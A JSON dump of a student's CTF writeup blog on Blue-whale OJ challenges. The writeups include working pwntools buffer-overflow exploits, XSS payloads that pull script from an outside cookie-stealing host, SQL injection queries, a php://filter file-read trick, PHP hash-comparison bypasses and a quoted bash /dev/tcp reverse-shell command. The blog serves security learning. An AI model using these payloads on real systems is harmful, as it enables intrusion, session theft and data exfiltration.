[{"title":"Stage1Day9 pwn","date":"2020-03-16T07:27:39.000Z","path":"2020-03-16/Stage1Day9-pwn/","text":"Blue-whale OJshellcode writeup. shellcode查看文件类型&amp;保护机制 与第一关不同，没有开启NX（不可执行），此时可以尝试在数据所在内存页写入shellcode 反编译结果12345678910int sub_804851A()&#123; char buf; // [esp+Ch] [ebp-1Ch] sub_80484EB(); puts(\"input your name\"); read(0, &amp;buf, 0x100u); printf(\"hello \"); return printf(&amp;buf);&#125; 可以看到与第一关一样read函数发生缓冲区溢出，buf大小为0x1Ch，读入了0x100h，可以尝试在执行read函数时写入shellcode。于是问题的关键就在于：如何找到buf在栈中的储存位置（以便修改返回地址指向shellcode）？ 动态调试确定buf在栈中位置 使用IDA的Remote Linux Debugger实现对pwn3的动态调试step1:将IDA目录\\dbgsrv\\里的linux_server文件放在linux里pwn3所在的同一目录（若是64位文件则使用linux_server64） step2:在linux下运行该文件:./linux_server开始监听step3:在IDA菜单栏→Debugger→switchdebugger中选择linuxdebugger，并完成配置 在push 0处设置断点，可以看到buf的地址以作为read的参数入栈：向buf输入“hello”，查看并验证栈中的情况：可以看到hello已经写入buf地址的栈中（逆序是因为小端序） 然而再次运行、调试发现buf在栈中的位置并不固定： 动态定位shellcode 解决方案：利用jmp esp运行shellcode原理解析思路：利用任意一个jmp esp指令的地址覆盖返回地址→覆盖buf和ebp→在返回地址之后紧跟着布置shellcode→函数在返回后将被定向去执行内存中的jmp esp指令→jmp esp指令执行后，处理器会到栈区函数返回地址之后的地方取指令执行，即shellcode jmp esp的机器码为FFE4，在文件中的地址为08048667。 payload:(0x1ch+0x4h)*a +[jmp esp]+shellcode exp123456from pwn import *r = remote('vps1.blue-whale.me',9992)shellcode=asm(shellcraft.sh())payload = 32*'a' + p32(0x08048667) + shellcoder.send(payload)r.interactive()","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"pwn","slug":"pwn","permalink":"https://purewhitywhite.github.io/tags/pwn/"}]},{"title":"Stage1Day8 Misc","date":"2020-03-15T12:52:46.000Z","path":"2020-03-15/Stage1Day8-Misc/","text":"Blue-whale OJForensics1、Forensics2、Shell writeup. Forensics1根据提示过滤http流量：跟踪http流，可知请求与返回的大概流程：打开网页→获取ico→三次输入密码→进入secretpage→获取s3cret.png于是将s3cret.png导出分组字节流→修改后缀名为图片格式→获得flag Forensics2知识补充 NFS实现了一个跨越网络的文件访问功能，其整个架构为Client-Server架构，客户端和服务端通过RPC协议进行通信，RPC协议可以简单的理解为一个基于TCP的应用层协议，它简化命令和数据的传输。 Mount: 从客户端的角度来说，NFS中的第一个操作称为 mount，Mount 代表将远程文件系统加载到本地文件系统空间中。 题解根据题目的hint，优先考虑与文件相关的NFS协议。过滤NFS流量，一番观察后可以看到flag.txt.gz： 继续向下看，双方大概进行了一番认证和目录的搜索，然后就到了用户向服务器写入数据的部分了： 查看数据包的详细内容，注意到contents部分很有可能含有flag（不过是乱码）：注意到这是个压缩文件，于是将其以压缩文件的形式解码，得到flag： Shell先看http流量，url为http://192.168.247.130/shell.php?cmd=bash -c &#39;bash -i &gt; /dev/tcp/192.168.247.128/12345 &lt;&amp;1 2&gt;&amp;1&#39;]貌似是建立了一个反弹shell，跟踪tcp流量就可看到行为： 对于www-data@UbuntuServer16:/tmp/flag$ cat flag.txt | base64 -w 0 | python -c &quot;print raw_input().swapcase()&quot;，再结合下面返回的zMXHz3TYzxzLCNnLx3nOzwWXBdfSBgWXBh0k，说明这就是flag里的内容，不过经过base64编码后再swapcase大小写互换，那么写脚本再改变大小写之后base64解码可得到flag： 1234import base64code = \"zMXHz3TYzxzLCNnLx3nOzwWXBdfSBgWXBh0k\"flag = base64.b64decode(code.swapcase())print(flag)","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Misc","slug":"Misc","permalink":"https://purewhitywhite.github.io/tags/Misc/"}]},{"title":"Stage1Day7 pwn","date":"2020-03-14T08:47:23.000Z","path":"2020-03-14/Stage1Day7-pwn/","text":"Blue-whale OJbof writeup. bof(buffer overflow)查看文件类型&amp;保护机制 可以看到这是一个32位的elf文件，开启了NX保护。 checksec检查的保护机制： STACKCANNARY(栈保护)：这个选项表示栈保护功能有没有开启。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。 NX(DEP)：NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 PIE（ASLR）：一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。内存地址随机化机制（address space layout randomization)，有以下三种情况：0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。 RELRO：设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。 reference：https://bbs.pediy.com/thread-250538.htm 进入IDA查看漏洞部分汇编代码： 123456789101112131415161718192021222324buf= byte ptr -1Chpush ebpmov ebp, espsub esp, 28h; 4: sub_804851B();call sub_804851B; 5: sub_804854A();call sub_804854A; 6: puts(\"can you pwn me?\");sub esp, 0Chpush offset s ; \"can you pwn me?\"call _puts; 7: return read(0, &amp;buf, 0x100u);add esp, 10hsub esp, 4push 100h ; nbyteslea eax, [ebp+buf]push eax ; bufpush 0 ; fdcall _readadd esp, 10hnopleaveretn 结合反编译后结果: 123456789ssize_t sub_8048573()&#123; char buf; // [esp+Ch] [ebp-1Ch] sub_804851B(); sub_804854A(); puts(\"can you pwn me?\"); return read(0, &amp;buf, 0x100u);&#125; 几点分析 buf开辟空间大小：1Ch（buf= byte ptr -1Ch） read函数向buf里可写100h字节的数据→栈溢出 参数从右向左入栈+调用方清理栈（每次call之后就add esp,10h）=__cdecl 栈结构以及调用关系： 如何getshell：system(&#39;/bin/sh&#39;); system()和/bin/sh位置： 确定覆盖位数和方法：1ch * a(buf)+4 * a(read()函数ebp)+0804A05C(system()地址)+4 * a(system()的虚拟返回地址)+0804A02C(system()的参数) exp&amp;getflag1234567from pwn import *r = remote('vps1.blue-whale.me',9990)system = 0x080483F0bin = 0x0804A02Cpayload = 'a'*32 + p32(system) + 'a'*4 + p32(bin)r.send(payload)r.interactive()","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"pwn","slug":"pwn","permalink":"https://purewhitywhite.github.io/tags/pwn/"}]},{"title":"Stage1Day6 Misc","date":"2020-03-13T14:59:03.000Z","path":"2020-03-13/Stage1Day6-Misc/","text":"Blue-whale OJAnother 01Game、Exif、PkCrack writeup. Another 01Game解题思路 0和1的数量很关键，首先统计0和1的数量： 1369.0/7 = 195.571428571428581369.0/8 = 171.1251369.0 ** 0.5 = 37.01369不是7和8的倍数，说明很可能和ASCII没关系。1369是37的平方，说明可以由0和1正好组成一个正方形（二维码，QR code） 统计字符串长度，可以当作 ASCII 编程解出 flag题目给出的提示非常清晰，下面开始写脚本进行二维码制作+flag获取：题解 使用qrcode包进行二维码生成12345678910111213141516import qrcodeqr = qrcode.QRCode( version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=10, border=2,)qr.add_data(\"0000000111011101100011011111010000000011111011011101111001100100101011111001000101011011101101000101010101000100100010110110011001101001010010100010010001011011001101000101010001010001001111101110001000011001010111101111100000000101010101010101010101010000000111111110110111010101100000011111111100010000011101110101010101010001110110001101110100010001010010100101010101011111001110010000110111000011110100111100011011100010110101001011101101001110100101101100101100110110110100010010010100100110010101110101010101010111111000000110111100001100111101000101001101110101110101110001010001010010011110010101011100010101111101001001101000111101000100110101010010011001010110000100000100010110010101010111010100101110101000100101110101010111010100000100000011001101010100011111010010100101011001100101010101110100100100100010010101101111010100111011001001001100010110011101000011110101110001011100000011110111010110001011111000010110001101110001001001010111101101000001111100111001000100110110100001101011001011011010001000011001011001100000010111000110110001011001010100000100011111111000011001010110011000111001010000000100111011101101110001010101000011111010100111001101010110101110001001000101001101110011001111100000001010100010110000011000011101010001000100010001010000010101001010101101000001001111101001100000101100011101000100110000000100101100100011011011001010110\")qr.make(fit=1)img = qr.make_image()img.save(\"qr.png\")# 扫出来结果貌似一直是它本身，看了半天决定上网上搜一下扫出来的结果。。。如下d = \"110011011011001100001110011111110111111001011000010101011011111100101110011101001111101011110111111100001110001001100001110101111010010111111110001101001010000110110000110010001100111111101\"for i in range(0, 189, 7): s = d[i:i+7] print(chr(int(s, 2)), end='') Exif什么是Exif 可交换图像文件格式（英语：Exchangeable image file format），是专门为数码相机的照片设定的文件格式，可以记录数码照片的属性信息和拍摄数据。 Exif信息是可以被任意编辑的，因此只有参考的功能。 Exif信息以0xFFE1作为开头标记，后两个字节表示Exif信息的长度。所以Exif信息最大为64 kB，而内部采用TIFF格式。 Exif数据结构题解使用Exiftool打开图片，可以在Credit中看到一串形似ascii码的数字，查表可得到flag。 PkCrack已知明文攻击 大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）或者已经通过其他手段知道zip加密文件中的某些内容时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。题解如图所示，选自被加密的文件和现有的明文，很快便可以生成被加密文件的解密版，打开即可看到flag。","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Misc","slug":"Misc","permalink":"https://purewhitywhite.github.io/tags/Misc/"}]},{"title":"Stage1Day5 Web","date":"2020-03-12T11:38:25.000Z","path":"2020-03-12/Stage1Day5-Web/","text":"XSS2 writeup. 本题目与XSS1的不同之处在于并没有告知过滤了哪些字符，我们将XSS1的payload输入后直接查看被过滤后的结果： hello&quot;;document.write(&quot;&lt;img&#32;src=x&#32;onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.fbisb.com/NXEO';&gt;&quot;);// 可以看到后台将替换为空，将单引号和双引号用反斜杠转义了。结合给出的提示，看到html使用GBK编码，联想到使用宽字节注入： 如何使用&amp;防御 “宽字节”：GB2312、GBK、GB18030、BIG5、Shift_JIS等，占两字节；ASCII占一字节。 触发条件：PHP6以下+magic_quote_gpc=on+使用 addslashes()函数对输入的单引号、双引号 、 反斜杠和 NULL 进行转义处理 利用方法: 输入%df%22时首先经过上面 addslashes 函数转义变成了%df%5c%22（%5c是反斜杠\\），之后后台将被转义后的输入数据返送回前端，前端对其进行 GBK 编码，那么%df%5c 转换成了一个汉字，而双引号就逃逸了出来： 防御手段：由于 php6 以上的版本 get_magic_quotes_gpc 选项被删除，故不可以再使用addslashes()函数进行转义。对于宽字节SQLi，可以用 mysqli_real_escape_string函数代替以前的addslashes 函数， 他们之间的区别就是 mysql_real_escape_string 会根据mysql 对象中的 mysql-&gt;charset 属性来对待传入的字符串，因此可以根据当前字符集来进行过滤，从而防止了宽字节注入。 后续处理虽然实现了双引号逃逸，但可以看到payload里还是有双引号和单引号，这时若被转义则不会生效。此时可以使用fromCharCode()函数进行绕过，这样可以将payload部分转为他们的ascii值，然后作为参数传入这个函数，从而达到防止被转义和过滤的目的。 1payload:name=%d5%22;document.write(String.fromCharCode(102,34,60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,120,115,115,46,102,98,105,115,98,46,99,111,109,47,78,88,69,79,39,59,62,34));// 由于对pwn的了解不足，先对相关知识进行储备： pwntools PLT&amp;GOT","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Web","slug":"Web","permalink":"https://purewhitywhite.github.io/tags/Web/"}]},{"title":"Stage1Day4 Reverse&Misc","date":"2020-03-11T10:46:44.000Z","path":"2020-03-11/Stage1Day4-Reverse-Misc/","text":"Blue-whale OJReverse sign in、junior math、LSB&amp;LSB2 writeup. 首先搞清楚一个一直都没弄清楚的问题，什么是逆向，什么是pwn（好像都是对着一堆汇编调来调去啊）？ 逆向工程（Reverse engineering），又称反向工程，是一种技术过程，即对一项目标产品进行逆向分析及研究，从而演绎并得出该产品的处理流程、组织结构、功能性能规格等设计要素，以制作出功能相近，但又不完全一样的产品。逆向工程源于商业及军事领域中的硬件分析。其主要目的是，在无法轻易获得必要的生产信息下，直接从成品的分析，推导产品的设计原理。-逆向工程-ctf-wiki 根据我做过的一点逆向题目，感觉就是把文件拖到IDA或者ollydbg里先静态分析一些文件，包括它的一些代码混淆加壳等的，再动态调试之类的吧 ”Pwn”是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵。 我的理解就是利用程序存在的一些问题诸如堆、栈溢出，rop，uaf之类的，来执行shellcode，最后获得目标机器的root权限。 x64dbg vs Ollydbg vs IDA Pro Reverse sign in用IDA打开之后直接按F5，main函数已经出来了： 123456789101112131415161718192021222324__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 result; // rax char s; // [rsp+0h] [rbp-30h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); printf(\"Please input your flag:\", a2, a3); __isoc99_scanf(\"%32s\", &amp;s); if ( strlen(&amp;s) == 32 ) &#123; if ( (unsigned int)sub_400686((__int64)&amp;s) ) puts(\"Right!\"); else puts(\"Wrong!\"); result = 0LL; &#125; else &#123; puts(\"Wrong!\"); result = 0LL; &#125; return result;&#125; 可以看到程序是一个flag检验器，输入flag后先判断有没有32个字符，进而再判断将输入的值带入一个sub_400686函数后的返回值，若是1就说明是flag。进入sub_400686看看： 1234567891011signed __int64 __fastcall sub_400686(__int64 a1)&#123; signed int i; // [rsp+Ch] [rbp-Ch] for ( i = 0; i &lt;= 31; ++i ) &#123; if ( (char)(*(_BYTE *)(i + a1) ^ byte_400818[i]) != i ) return 0LL; &#125; return 1LL;&#125; 意思是将a1（输入的值）逐位与byte_400818这个数组逐位进行^（异或）操作，如果他们的结果==循环变量i，那么就返回1（输入的flag对了）。看看byte_400818： x dup(y)，x是重复的次数，（）里的y是要重复的数刚好32个字符，那么可以编写脚本来找flag，思路是这样的，flag[i]^byte_400818[i] == i，那么flag[i] == byte_400818[i]^i 代码： 1234# 先转十进制d = [102, 109, 99, 100, 127, 60, 54, 114, 87, 66, 100, 59, 123, 82, 124, 60, 102, 84, 96, 96, 39, 74, 73, 127, 113, 88, 82, 114, 125, 117, 42, 98]for i in range(32): print(chr(d[i] ^ i), end='') junior math按F5查看伪代码： 123456789101112131415161718192021222324__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; printf(\"Please input your flag:\", a2, a3); __isoc99_scanf(\"%32s\", &amp;byte_602080); sub_4005D6(); sub_40063F(); sub_4006A8(); sub_400711(); sub_40077A(); sub_4007E3(); sub_40084C(); sub_4008B5(); sub_400918(); sub_400981(); sub_4009EA(); sub_400A53(); sub_400ABC(); sub_400B25(); if ( dword_602064 ) puts(\"Wrong!\"); else puts(\"Right!\"); return 0LL;&#125; 问题：print为何还输入了a2 a3两个参数？ 看到输入flag后进行了一堆函数运算，最后判断dword_602064这个东西是0的话输入值即为flag。进入一个函数看看： 12345678910__int64 sub_4005D6()&#123; _BOOL4 v0; // edx __int64 result; // rax v0 = (byte_602080 - 147) * byte_602080 != -4590 || (byte_602082 - 147) * byte_602082 != -4850; result = v0 | (unsigned int)dword_602064; dword_602064 |= v0; return result;&#125; 看到这个函数计算了输入字符串的第1位（byte_602080）进行运算后与-4590进行判断，如果这个将第一位带入左边的式子计算结果不等于-4590，那么||（或）的左侧就是一个1，如果等于的话就是0。返回值result貌似没有起到作用不分析，然后将dword_602064与v0进行逐位或，结果存入v0。看了其他的函数结构都一样，变化的就是测试的是输入字符串的第几位。可以看出我们每一次都要满足v0是0，这样才能保证v0与dword_602064逐位或之后才不会出现1（出现1就错了），那么就要式输入字符串的每一位都满足每个函数里的一元二次运算。试着挑一个算了算，(byte_602080 - 147) * byte_602080 = -4590的一个解为102，查ascii表为f，就很显然了。把每一位结果都算出来查ascii即可得到flag。 LSB&amp;LSB2最低有效位（LSB）的原理：因为每个图片的颜色都是由“红”、“绿”、“蓝”三种颜色组成，图片中的其他颜色均可以由这三种颜色混合而成。然而PNG的每种颜色的大小在储存位中占8bit，而LSB隐写原理就是把每种颜色的最后一位进行改写，但是改写后的图片和原图相比，在人的眼中是没有区别的。 题解stegsolve打开图片后调整到Red plane0页面就可以看到这个二维码，扫码即得到flag。LSB2的话用lint里提示的zsteg -a secret.png即可看到flag。","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Misc","slug":"Misc","permalink":"https://purewhitywhite.github.io/tags/Misc/"},{"name":"Reverse","slug":"Reverse","permalink":"https://purewhitywhite.github.io/tags/Reverse/"}]},{"title":"Stage1Day3 Web&Misc","date":"2020-03-10T11:07:53.000Z","path":"2020-03-10/Stage1Day3-Web-Misc/","text":"Blue-whale OJBasic SQL、Invisible flag、docx writeup. Basic SQL上来先确定是什么类型的注入，当输入&#39;时候出错，说明这是一个字符型的注入点。首先看当前数据表有几列，试到4时出错，说明有三列 1&apos; order by 4# 接下来看前三列中回显在哪几列 1&apos; union select 1,2,3# 可以看到最下面显示了2、3俩数字，表示可以利用这两个位置回显我们想要的结果，比如当前数据库数据库名、版本： 12&apos; union select 1,database(),version()#//回显为news，5.5.62 再看看所有的库名： 12&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata#回显为information_schema,news，information_schema库是MySQL自带的，它提供了访问数据库元数据（数据库名或表名、列的数据类型、访问权限等）的方式，优先看news库 接下来就是爆表、列、数据了：爆表： 12&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;news&apos;#//回显为f1agfl4gher3,news，进f1agfl4gher3看看 爆列： 12&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;f1agfl4gher3&apos;#//回显为id,h3r31sfl4g，flag快来了 爆数据： 12&apos; union select 1,group_concat(id),group_concat(h3r31sfl4g) from f1agfl4gher3#//回显就有flag 这比较基础，就是sqli-labs第二关吧，不过sql注入各种操作很多，还有sqlmap的使用，这都是以后要学习的东西 Invisible flag看到图片只有一半的BLUE-WHALE，再结合提示里的图片长度，就知道了应该使用010editor来修改图片的长度了：将修改后的结果导出为一个新的图片，即可在下方看到flag。 docx结合提示知道docx格式的文件本质上是一个zip文件，修改后缀名后就可以解压。一个docx文件可能会包含这些目录和组件： [Content_Types].xml这个文件描述的是整个文档内容的类型，把各个xml文件组合成一个整体。 docProps文件夹这个文件夹中的xml记录了docx文档的主要属性信息Core.xml：描述文件的创建时间，标题，主题和作者等给予open xml约定文档格式的通用文件属性App.xml：描述文档的其他属性，文档类型，版本，只读信息，共享，安全属性等特定的文件属性 rels 文件夹这个文件夹存放了所有指定的rels文件.res文件描述了文档结构中的起始关系，也可以叫做关系部件 item1.xml包含了一些文档中出现的数据。例如自定义XML数据部件。 打开修改后缀名后的文件，即可看到flag.xml，打开即可看到flag。 体会 比较熟悉的Web部分做完了，接下来就是Misc、逆向和pwn了，都没咋做过，希望一切顺利","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Web","slug":"Web","permalink":"https://purewhitywhite.github.io/tags/Web/"},{"name":"Misc","slug":"Misc","permalink":"https://purewhitywhite.github.io/tags/Misc/"}]},{"title":"Stage1Day2 Web","date":"2020-03-09T14:12:50.000Z","path":"2020-03-09/Stage1Day2-Web/","text":"Blue-whale OJBabyXSS、XSS1、BasicFileInclude writeup. BabyXSS 可以看到这个输入框应该就是注入点了。下面这个地方要求输入一个md5后前六位恰好为等号右边的字符串，一开始以为是找碰撞之类的吧，不过结合hint里推荐的proofofwork来看应该是要慢慢试出来。不过在安装cmake、MinGW，多次google设置cmakefile均无果后选择使用hashlib包。 123456import hashlibfor i in range(9999999999): s = hashlib.md5(str(i).encode(encoding='utf8')).hexdigest() if s.startswith(\"xxxxx\"): print(i) break 之后就很轻松了，得到对应的字符串后，在上方的留言框里放入获取cookie的脚本，即可将其提交到管理员的后台，（管理员在看到这条信息时）XSS平台便收到了管理员的token：使用Burp抓包，将自己的cookie替换为这个token再发包即可得到flag。 XSS1 这题与BabyXSS比较相似，也是获取管理员的cookie，不过这一次我们可以看到被注入xss的页面以及它过滤一些敏感符号的代码： 12345678910111213141516&lt;form action=\"\" method=\"GET\"&gt; &lt;input type=\"text\" name=\"name\" autofocus=\"autofocus\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt;&lt;?phpif(isset($_GET['name']))&#123; $text = $_GET['name']; $text = str_replace('\"','',$text); $text = str_replace('&gt;','',$text); $text = str_replace('&lt;','',$text); $text = str_replace(\"\\n\",'',$text); echo \"&lt;svg&gt;&lt;script&gt;var a=\\\"\". $text . \"\\\"&lt;/script&gt;&lt;/svg&gt;\";&#125;echo '&lt;hr /&gt;';show_source(__FILE__); 可以看到本题对” &lt; &gt; 以及回车进行了过滤，便考虑使用html编码来绕过。 hello&quot;;document.write(&quot;&lt;img&#32;src=x&#32;onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.fbisb.com/NXEO';&gt;&quot;);// 先将双引号闭合，再在html中写进去一个src属性为x（会出错）的img标签，然后onerror会在html中写进去一个src属性为cookie偷取链接的script，最后将后面的一个双引号注释掉。此处之注意将空格也进行编码处理（在提交的页面会进行检测）。输入文本框提交看看效果： 可以看到成功地写入了上面提到的img标签，并触发了chrome XSS Auditor的预警。 PS:不知道出了什么问题XSS平台一直收不到cookie，有待进一步观察 注意到hint里提示，发现输入框有autofocus属性，想到可以结合onfocus来触发XSS，但是这个输入框已经闭合了，注入点并不在其中，又想到自己搞一个文本框，设置一个autofocus，这样管理员进入评论管理版后不用任何操作就会发送flag，但实测这样貌似还是不行 BasicFileInclude 题目提示”flag就在这里，但是你看不到“。暗示要读取flag，鉴于不知道当前路径（无法使用file协议）,即考虑使用php伪协议php://filter php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 这是其参数： resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 123php://filter/read=convert.base64-encode/resource=upload.php这里读的过滤器为convert.base64-encode，即把输入流base64-encode。resource=upload.php，代表读取upload.php的内容 问题：一定要使用base64吗？还是说这是一种固定形式（网上几乎都是这种解答） 照葫芦画瓢地构造payload: http://vps1.blue-whale.me:23338/?page=php://filter/read=convert.base64-encode/resource=flag 网页上返回了一串base64编码，解码后发现这就是flag的代码。","tags":[{"name":"blue-whale","slug":"blue-whale","permalink":"https://purewhitywhite.github.io/tags/blue-whale/"},{"name":"Web","slug":"Web","permalink":"https://purewhitywhite.github.io/tags/Web/"}]},{"title":"Stage1Day1 Web","date":"2020-03-08T11:46:09.000Z","path":"2020-03-08/Stage1Day1-Web/","text":"Blue-whale OJcalculator、RapidTyping、Basic PHP、Basic PHP 2 writeup. 今天是测试第一阶段的第一天。Keep posting! Calculator RapidTyping Basic PHP Basic PHP 2 总结Calculator 从题目要求可以看到，需要在1.5s内计算出一个比较大的四则运算。按计算器估计是来不及了，由hint我们知道用Python来实现。先贴代码： 12345678910111213import requestsfrom bs4 import BeautifulSoupurl = \"http://vps1.blue-whale.me:23331/calculator/\"cal_session = requests.session()cal_respond = cal_session.get(url)# print(cal_respond.text)soup = BeautifulSoup(cal_respond.text, 'lxml')span = soup.find(\"span\", id=\"exp\")num = eval(span.text.replace('=', ''))# print(num)ans = &#123;\"answer\": num&#125;r = cal_session.get(url, params=ans)print(r.text) 代码分为几个阶段：首先使用了requests，它是基于urllib3的一个用于发起http请求的包；之后引入了比较常见的BeautifulSoup。创建一个session对象后，发送请求并获得返回的response对象。 接下来将其转为BeautifulSoup对象，找到其中id为exp的span标签，将其内容去掉最后的等号后作为参数传入eval函数，将计算结果封装为get的参数，再次请求得到返回的带有flag的网页。 通过这个入门题目可以练习常用包requests和BeautifulSoup的使用。 RapidTyping 这个题目跟上个题目有点相似，也是要求在短时间内完成验证码输入。题目给出hint说不是用图像识别啥的，那就看看网页源代码吧。 做过的CTF题目不多，多是入门题，发现这种比较入门的题目通常要结合Base64之类的东西来考察，或者是在前端做一些限制。把后面这堆结尾是等号的代码拖到Base64解码里会发现是一大堆形似html的代码，其中text标签中包含的就是图片中的字母。下面贴上代码： 12345678910111213141516171819202122import requestsfrom bs4 import BeautifulSoupimport base64url = \"http://vps1.blue-whale.me:23331/captcha/\"session = requests.session()respond = session.get(url)soup = BeautifulSoup(respond.text, \"lxml\")# print(soup.img.attrs[\"src\"])encoded = soup.img.attrs[\"src\"].lstrip(\"data:image/svg+xml;base64,\")# print(encoded)encoded = base64.b64decode(encoded)soup = BeautifulSoup(encoded, \"lxml\")decoded = soup.find_all(name=\"text\")ans = \"\"for i in range(500): for s in decoded: if i == int(s[\"x\"]): ans += str(s.text)# print(ans)answ = &#123;\"code\":ans&#125;r = session.get(url,params=answ)print(r.text) 代码逻辑如下：依然是requests+BeautifulSoup获取页面内容，截取img标签src属性中的base64部分后解码，将text部分提取出来后带入二重循环，保证将每个字母按照x坐标的顺序加入到ans字符串中。最后将结果作为参数再次请求得到flag。 这里先按x坐标排序后再逐个提取字母速度更快，不过对python的数据结构不甚了解，未能实现。Python的学习有待加强。通过这个题目练习了requests、base64和BeautifulSoup的使用。 Basic PHP这题在bugku里见过，点开题目即可看到代码。 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Exercise&lt;/title&gt; &lt;meta charset=\"UTF-8\"&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;PHP's basic feature&lt;/h1&gt;&lt;!--好吧其实是老套路了--&gt;&lt;?phprequire_once('flag.php');if (isset($_GET['name']) and isset($_GET['password']) &amp;&amp; isset($_GET['test']))&#123; // ========== Stage 1 ========== $test=$_GET['test']; $test=md5($test); if($test=='0') &#123; print 'You passed stage 1.&lt;br /&gt;'; &#125; else&#123; print \"Game over at stage 1.\"; exit(); &#125; // ========== Stage 2 ========== if ($_GET['name'] == $_GET['password'])&#123; print 'Your password can not be your name.'; exit(); &#125; else if (sha1($_GET['name']) === sha1($_GET['password']))&#123; print 'You passed stage 2.&lt;br /&gt;'; print 'Flag: '.$flag; &#125; else&#123; print 'Invalid password'; exit(); &#125;&#125;echo '&lt;hr /&gt;';show_source(__FILE__);?&gt;&lt;/body&gt;&lt;/html&gt; 输入name、password和test三个参数即可进入stage1，接下来是md5()漏洞的一个考察： PHP在处理哈希字符串时，会利用“!=”或“==”来对哈希值进行比较，其中存在一个缺陷，就是它把每个以“0E”开头的哈希值都解析为0后再进行比较。所以，两个不同的密码经过md5()哈希以后，其哈希值都是以“0E”开头的话，那么PHP将会认为他们是相等的，都是0。 根据这个特性，找到一些md5后产生“0E”开头的字符串作为test的值： 123456QNKCDZO240610708s878926199as155964671as214587387as214587387a 随后进入stage2，我们发现题目要求name和password的值不同，而sha1的结果相同。想找到这种碰撞的概率太低了，此处考察了 sha1() 和 md5() 处理数组时会直接返回null，那么可以使 name 和 password为数组类型，sha1 对数组处理后返回 null 绕过 ===(===会判断左右两边的类型和值是否相同) 。 此时可以令name[]=0&amp;password[]=1，即可得到flag。 问题：令name[]=0&amp;password[]=0为什么不行？总之会返回null，值是0还是1会有影响吗 payload:http://vps1.blue-whale.me:23331/feature/?test=s878926199a&password[]=0&name[]=1 Basic PHP 2 题目给出要求getshell，联想到一句话木马，在这个框中随意输入内容，点击start进入新的页面： 在文本框输入一些内容后点击提交，回显success，此时再点击上面的./config.php会发现之前在文本框中的内容已被写入config.php。再结合下面的代码来看： 123456789101112&lt;?phpif(isset($_GET['content']))&#123; $filename = 'config.php'; $content = $_GET['content']; if(is_int(stripos($content, 'php')) || is_int(stripos($content, '&lt;'))) &#123; echo 'Invalid input'; &#125; else &#123; file_put_contents($filename, $content); echo 'Success'; &#125;&#125; stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。strpos() 函数查找字符串在另一字符串中第一次出现的位置（大小写敏感）。 意思已经比较明显了，我们可以通过content这个参数修改config.php中的内容，但是若想写入php一句话木马，就无法通过stripos()的检验(可以看到对php和&lt; 这两个字符串做了检测 